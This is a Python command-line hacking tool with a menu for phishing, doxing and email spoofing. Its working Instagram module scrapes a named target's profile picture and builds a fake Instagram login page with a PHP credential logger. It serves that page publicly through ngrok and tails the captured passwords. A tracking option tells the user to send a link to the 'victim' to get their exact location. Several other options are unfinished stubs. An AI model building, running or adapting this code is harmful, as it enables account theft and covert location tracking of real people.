#!/usr/bin/env python3

# I try to code a shit here
import time
import os
import sys
import requests
from pyvirtualdisplay import Display
import subprocess

from data.instagram import *
BLUE = "\033[1;34m"
RED = "\033[1;31m"
GREEN = "\033[1;33m"
CYAN = "\033[1;96m"
RESET = "\033[0m"
PINK = "\033[1;95m"

try:
	import selenium, requests
	from selenium import webdriver

except:
	print ("[*] Error Importing Exterinal Libraries")
	print ("[*] Trying to install it using the requirements.txt file..\n")
	try:
		os.system("pip install -r requirements.txt")
	except:
		try:
			#if python not in the path (In windows case)
			os.system(str(sys.executable)+" -m pip install -r requirements.txt")
		except:
			print ("[*] Failed installing the requirements [ Install it yourself :p ]")
		exit()

def clear():
    os.system("clear")
def banner():
    print("          "+RED+"██ ▄█▀ ███▄    █  ██▓  ▄████  ██░ ██ ▄▄▄█████▓  ██████ ▓█████  ▄████▄"+RESET)
    print("          "+RED+"██▄█▒  ██ ▀█   █ ▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█"+RESET)
    print("          "+RED+"▓███▄░ ▓██  ▀█ ██▒▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░░ ▓██▄   ▒███   ▒▓█    ▄"+RESET)
    print("          "+RED+"▓██ █▄ ▓██▒  ▐▌██▒░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░   ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒"+RESET)
    print("          "+RED+"▒██▒ █▄▒██░   ▓██░░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ▒██████▒▒░▒████▒▒ ▓███▀ ░"+RESET)
    print("          "+RED+"▒ ▒▒ ▓▒░ ▒░   ▒ ▒ ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░"+RESET)
    print("          "+RED+"░ ░▒ ▒░░ ░░   ░ ▒░ ▒ ░  ░   ░  ▒ ░▒░ ░    ░    ░ ░▒  ░ ░ ░ ░  ░  ░  ▒"+RESET)
    print("\n")
    time.sleep(0.5)
# animation in development XD copied from a tool
def Animation(text):
    try:
        global stopAnimation
        i = 0
        while Animation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(GREEN + tempText + '\r' + RESET)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)


def facebook():
    print("COMING SOON!")
    time.sleep(1)
    main()
# insta copied from Phishx
def instagram():
    instapic = ''
    Uname = input("  "+BLUE+"["+CYAN+"Username"+BLUE+"]"+GREEN+"> "+RESET)
    print(PINK+"Searching username on Instagram..."+RESET)
   
    time.sleep(3)

    print(RED+"USER FOUND!"+RESET )
    link = "https://instagram.com/"+str(Uname)+"/"

    display = Display(visible=0, size=(800, 600))
    display.start()
    
    br = webdriver.Chrome()
    br.get(link)
    time.sleep(8)
    l = ''
    try:
        l=br.find_element_by_css_selector("#react-root > section > main > div > header > div > div > div > button > img").get_attribute("src")

    except Exception:

	    l=br.find_element_by_css_selector("#react-root > section > main > div > header > div > div > span > img").get_attribute("src")

    br.close()
    display.stop()

    os.system("rm -r SERVER/")

    subprocess.call(['mkdir','-p','SERVER/'])

    filedata = str(Main_Instagram)
    filedata = filedata.replace('[l]', str(l))
    filedata = filedata.replace('[Uname]', str(Uname))

    with open('./SERVER/index.html', 'w') as file:
            file.write(filedata)
    file.close()

    logindata = str(Login_Instagram)
    with open('./SERVER/login.php', 'w') as file:
            file.write(logindata)
    file.close()
    secured_html = str(Secured_Instagram)
    with open('./SERVER/account_secured.html', 'w') as file:
            file.write(secured_html)
    file.close()


    os.system("touch ./SERVER/creds.txt")
    os.system("chmod -R 777 SERVER/")



    os.system('xterm -e "cd ./SERVER/ && php -S 127.0.0.1:4444" &')
    time.sleep(2)
    os.system("ngrok http 4444 > /dev/null &")

    time.sleep(3)

    display = Display(visible=0, size=(800, 600))
    display.start()


    browser = webdriver.Chrome()

    browser.get("http://localhost:4040/status")

    time.sleep(5)

    url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
    browser.close()
    phish_url = str(url_f)
    display.stop()

    print("             \033[0;37m################################################")
    print("             #  "+RED+"Listening for Creds on Uname:\033[0;94m"+str(Uname)+"\033[0;37m   #")
    print("             ################################################\033[0;93m")
    print("             "+BLUE+"[\033[0;34m*"+BLUE+"]-["+RED+"EXTRA-URL"+BLUE+"]"+RESET+": \033[0;34m"+phish_url+"\033[0;93m\n")


    os.system("tail -f ./SERVER/creds.txt")

    print("\n                 \033[0;34m######################################")
    print("                 #              --DONE--              #")
    print("                 ######################################"+RESET)

    os.system("pkill -9 ngrok")
    os.system("pkill -9 php")

def iptracker():
    print("SOON")
    time.sleep(1)
    main()
# tool not mine but menu by me
def trackurl():
    print(RED+"WARNING!!! MAC ONLY!!!"+BLUE+"SEND THE Serveo URL GIVEN TO THE VICTIM TO GET HIS EXACT LOCATION IN THE XTERM(lat+long)"+CYAN+"\nPaste the Ngrok url below..."+RESET) 
    time.sleep(3)

    os.system("/TOOLS/Trackers/TrackURL/TrackUrl.sh")
    time.sleep(10)
    print(PINK+"Send the URL to Victim!"+RESET)








# me 
def main():
    clear()
    banner()


    print(BLUE+"\n1."+CYAN+"Phishing\n"+BLUE+"2."+CYAN+"Doxing\n"+BLUE+"3."+CYAN+"SpoofingEmail\n"+BLUE+"0."+CYAN+"Exit"+RESET)
    print("")
    choice = input(PINK+"Choose > " +RESET)
    if not choice.isdigit():
        main()
    else:
        choice = int(choice)
    #1.Phishing module
    if int(choice) == 0:
        print("")
        print (RED+"Exiting... "+RESET)
        time.sleep(1)
        exit()

    if choice == 1:
        phish()
    if choice == 2:
        dox()
    if choice == 3:
        sendemail()


    else:
        main()


#me
def dox():
    clear()
    time.sleep(0.5)
    print(CYAN+"1.TrackURL\n2.IpTracker\n9.Back"+RESET)
    choose_dox = input(PINK+"Choose > "+RESET)
    try:
        int(choose_dox)
    except ValueError:
        dox()
    if choose_dox == "9":
        main()
    elif int(choose_dox) == 1:
        trackurl()
    elif int(choose_dox) == 2:
        iptracker()
    if choice_dox == "":
        dox()
    else:
        dox()
     
#me
def phish():
    clear()
    time.sleep(0.5)
    print(CYAN+"1.Facebook\n2.Instagram\n9.Back"+RESET)
    choice_phish = input(PINK+"Choose > "+RESET)
    try:
        int(choice_phish)
    except ValueError:
        phish()
    if choice_phish == "9":
        main()
    #Facebook
    elif int(choice_phish) == 1:
        facebook()
    #Instagram
    elif int(choice_phish) == 2:
        instagram()
    elif choice_phish == "":
        phish()
    else:
        phish()
    
    
#me XD
def sendemail():
    print("SOON")
    time.sleep(1)
    main()








#me idk
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("")
        print (RED+"Exiting... "+RESET)
        time.sleep(1)
        exit()
    


